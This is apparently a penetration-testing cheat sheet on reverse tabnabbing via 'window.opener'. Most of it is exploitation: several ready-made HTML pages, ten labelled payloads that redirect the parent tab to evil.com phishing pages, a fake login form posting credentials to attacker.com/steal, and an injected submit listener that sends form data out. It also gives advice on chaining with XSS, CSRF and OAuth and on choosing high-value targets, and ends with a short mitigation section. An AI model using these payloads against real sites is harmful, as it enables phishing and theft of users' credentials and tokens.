## Overview

**Tabnabbing** (also known as **Reverse Tab Nabbing**) is a web security vulnerability that exploits the `window.opener` JavaScript object reference. When a user clicks a link with `target="_blank"` that lacks proper security attributes, the newly opened page gains control over the original (parent) page through the `window.opener` property.

**Attack Flow:**

- Attacker controls a link on the target website (e.g., forum post, comment section)
- Victim clicks the link, opening it in a new tab
- Malicious page uses `window.opener.location` to redirect the original tab
- Original tab is replaced with a phishing site that mimics the legitimate page
- User returns to the "original" tab, sees a fake login form, and submits credentials

**Severity:** Typically rated as **Low to Medium** severity, but can lead to credential theft and account compromise.

---

## 🔍 Vulnerability Identification

### Vulnerable Link Patterns

Search for links matching these patterns:

```html
<!-- Vulnerable: Has target="_blank" but missing noopener -->
<a href="..." target="_blank" rel="" />

<!-- Vulnerable: Has target="_blank" without rel attribute -->
<a href="..." target="_blank" />

<!-- Vulnerable: Has rel="opener" explicitly set -->
<a href="..." target="_blank" rel="opener" />

<!-- Safe: Has noopener in rel attribute -->
<a href="..." target="_blank" rel="noopener" />
```

### Quick Assessment Strategy

**Action Steps:**

1. **Reconnaissance Phase**
    
    - Identify user-generated content areas (forums, comments, profiles)
    - Look for external link functionality
    - Check for markdown/HTML input fields
2. **Testing Methodology**
    
    - Inspect links using browser DevTools
    - Search page source for `target="_blank"`
    - Verify absence of `rel="noopener"` or `rel="noreferrer"`
3. **Validation**
    
    - Post a test link to your controlled domain
    - Include JavaScript payload to detect `window.opener`
    - Click the link and observe behavior

---

## 🎯 Exploitation Methods

### Method 1: Basic Redirection Attack

**Setup Steps:**

1. **Create Malicious Page** (`malicious.html`)

```html
<!DOCTYPE html>
<html>
<body>
  <script>
    if (window.opener) {
      window.opener.location = "https://evil.com/phishing.html";
    }
  </script>
  <h1>Loading...</h1>
</body>
</html>
```

2. **Create Phishing Page** (`phishing.html`)

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Session Expired - Please Login Again</h1>
  <form action="https://attacker.com/steal" method="POST">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
  </form>
</body>
</html>
```

3. **Post Link on Vulnerable Site**

```html
Check out this amazing article!
<a href="https://attacker.com/malicious.html" target="_blank">Click Here</a>
```

### Method 2: Multi-Check Payload

**Enhanced exploitation with parent frame checking:**

```html
<!DOCTYPE html>
<html>
<body>
  <script>
    // Check window.opener for new tab scenario
    if (window.opener) {
      window.opener.parent.location.replace('https://evil.com/phishing.html');
    }
    
    // Check parent window for iframe scenario
    if (window.parent != window) {
      window.parent.location.replace('https://evil.com/phishing.html');
    }
  </script>
  <h1>Content Loading...</h1>
</body>
</html>
```

### Method 3: Stealthy Delayed Attack

**Delay redirection to avoid immediate detection:**

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Interesting Article Content</h1>
  <p>Lorem ipsum dolor sit amet...</p>
  
  <script>
    // Wait 5 seconds before redirecting parent
    setTimeout(function() {
      if (window.opener && !window.opener.closed) {
        window.opener.location = "https://evil.com/phishing.html";
      }
    }, 5000);
  </script>
</body>
</html>
```

### Method 4: Event-Based Exfiltration

**Modify JavaScript events for stealthier attacks:**

```html
<!DOCTYPE html>
<html>
<body>
  <script>
    if (window.opener) {
      // Instead of immediate redirect, inject event listeners
      try {
        window.opener.document.addEventListener('submit', function(e) {
          // Exfiltrate form data
          fetch('https://attacker.com/steal', {
            method: 'POST',
            body: new FormData(e.target)
          });
        });
      } catch(e) {
        // Cross-origin restriction, fall back to redirect
        window.opener.location = "https://evil.com/phishing.html";
      }
    }
  </script>
</body>
</html>
```

---

## 🔓 Accessible Window Properties

### Cross-Origin Access (Different Domains)

When the malicious page is on a **different domain**, only these properties are accessible:

- **`opener.closed`** - Check if window is closed (boolean)
- **`opener.frames`** - Access iframe elements
- **`opener.length`** - Number of iframes in parent
- **`opener.opener`** - Reference to window that opened parent
- **`opener.parent`** - Parent window reference
- **`opener.self`** - Current window reference
- **`opener.top`** - Topmost browser window

### Same-Origin Access (Same Domain)

When domains are **identical**, attacker gains access to **ALL properties** of the `window` object, including:

- Full DOM manipulation
- Access to cookies (if not HttpOnly)
- JavaScript execution context
- Event listeners
- Storage APIs (localStorage, sessionStorage)

---

## 💣 Robust Modern Payloads

### Payload 1: Universal Redirect

```javascript
if (window.opener) window.opener.location = "https://evil.com/phishing";
```

### Payload 2: Parent Frame Redirect

```javascript
if (window.opener) window.opener.parent.location.replace('https://evil.com');
```

### Payload 3: Delayed Execution

```javascript
setTimeout(() => {
  if (window.opener && !window.opener.closed) {
    window.opener.location = "https://evil.com/phishing";
  }
}, 3000);
```

### Payload 4: Check Before Redirect

```javascript
if (window.opener && typeof window.opener.location !== 'undefined') {
  window.opener.location.href = "https://evil.com/phishing";
}
```

### Payload 5: Multi-Target

```javascript
if (window.opener) window.opener.parent.location.replace('https://evil.com');
if (window.parent != window) window.parent.location.replace('https://evil.com');
```

### Payload 6: Error Handling

```javascript
try {
  if (window.opener) {
    window.opener.location = "https://evil.com/phishing";
  }
} catch(e) {
  console.log("Blocked by browser policy");
}
```

### Payload 7: History Manipulation

```javascript
if (window.opener) {
  window.opener.history.pushState({}, '', 'https://evil.com/phishing');
  window.opener.location.reload();
}
```

### Payload 8: Conditional Redirect

```javascript
if (window.opener && document.referrer.includes('target-site.com')) {
  window.opener.location = "https://evil.com/phishing";
}
```

### Payload 9: Storage Poisoning (Same-Origin)

```javascript
if (window.opener && window.opener.localStorage) {
  window.opener.localStorage.setItem('redirected', 'true');
  window.opener.location = "https://evil.com/phishing";
}
```

### Payload 10: Stealth Full-Page Overlay (Same-Origin)

```javascript
if (window.opener) {
  try {
    const overlay = window.opener.document.createElement('div');
    overlay.innerHTML = '<iframe src="https://evil.com/phishing" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999;"></iframe>';
    window.opener.document.body.appendChild(overlay);
  } catch(e) {
    window.opener.location = "https://evil.com/phishing";
  }
}
```

---

## ⚡ Higher Impact Scenarios

### Chaining with Other Vulnerabilities

**1. XSS + Tabnabbing**

- Store XSS payload that creates vulnerable links dynamically
- Increases reach and persistence

**2. CSRF + Tabnabbing**

- Redirect to page that triggers CSRF attack
- User performs unintended actions on return

**3. OAuth Flow Hijacking**

- Redirect during OAuth callback
- Capture authorization codes or tokens

**4. Session Fixation**

- Set malicious session cookie before redirecting to phishing page
- Increases credential theft success rate

### High-Value Targets

**Focus on these features:**

- **Password reset workflows** - Users expect to re-enter credentials
- **Session timeout pages** - Natural to see login screens
- **Payment gateways** - High-value credential theft
- **Admin panels** - Elevated privileges
- **Support ticket systems** - Users trust support links

---

## 🛡️ Mitigation & Prevention

### Developer Side

**1. Add Security Attributes**

```html
<!-- Recommended: Use both noopener and noreferrer -->
<a href="https://external-site.com" target="_blank" rel="noopener noreferrer">
  Safe External Link
</a>
```

**2. JavaScript Fix**

```javascript
// Set opener to null after opening window
const newWindow = window.open('https://external-site.com', '_blank');
newWindow.opener = null;
```

**3. Content Security Policy (CSP)**

```
Content-Security-Policy: default-src 'self'; frame-ancestors 'none';
```

**4. Feature Policy**

```html
<meta http-equiv="Feature-Policy" content="window-open 'none'">
```

**5. JavaScript Link Handler**

```javascript
document.querySelectorAll('a[target="_blank"]').forEach(link => {
  const rel = link.getAttribute('rel') || '';
  if (!rel.includes('noopener')) {
    link.setAttribute('rel', rel + ' noopener noreferrer');
  }
});
```

### User Side

**Browser Protection:**

- Modern browsers (Chrome 88+, Firefox 79+) automatically apply `noopener` behavior
- Keep browser updated
- Use security-focused browser extensions

**User Awareness:**

- Always check URL bar when re-entering credentials
- Look for HTTPS and valid certificates
- Be suspicious of unexpected login prompts

---

## 🚀 Testing Checklist

**Quick Win Strategies:**

- [ ] Search for `target="_blank"` in page source
- [ ] Check user-generated content areas
- [ ] Verify `rel` attribute values
- [ ] Test with controlled malicious page
- [ ] Document accessible `window.opener` properties
- [ ] Test cross-origin vs same-origin scenarios
- [ ] Validate browser security features
- [ ] Check for CSP headers
- [ ] Review JavaScript event handlers

**Motivation Boost:** 🎯 Each vulnerable link you identify strengthens your pentesting skills!

---

## 📚 References

- [HackerOne Report #260278](https://hackerone.com/reports/260278)
- [OWASP Reverse Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)
- [HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#tabnabbing)
- [MDN Window Object Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window)

---

**Mental Hack:** 🧩 Treat tabnabbing like finding hidden doors—simple to spot once you know where to look, but devastating when left open!